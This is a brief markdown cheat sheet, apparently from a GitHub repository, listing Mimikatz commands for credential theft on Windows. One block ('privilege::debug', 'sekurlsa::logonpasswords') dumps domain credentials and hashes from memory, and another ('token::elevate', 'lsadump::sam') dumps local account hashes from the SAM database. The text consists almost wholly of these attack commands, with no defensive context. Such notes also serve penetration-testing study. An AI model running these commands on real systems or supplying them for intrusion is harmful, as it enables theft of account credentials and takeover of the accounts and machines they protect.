# MIMIKATZ.exe

<img width="1107" height="484" alt="image" src="https://github.com/user-attachments/assets/f60e6293-7d52-4f5c-866c-7000c85e14c7" />



Domain hash/creds dumping
```
privilege::debug
sekurlsa::logonpasswords
```

local creds/hash dumping
```
privilege::debug
token::elevate
lsadump::sam
```

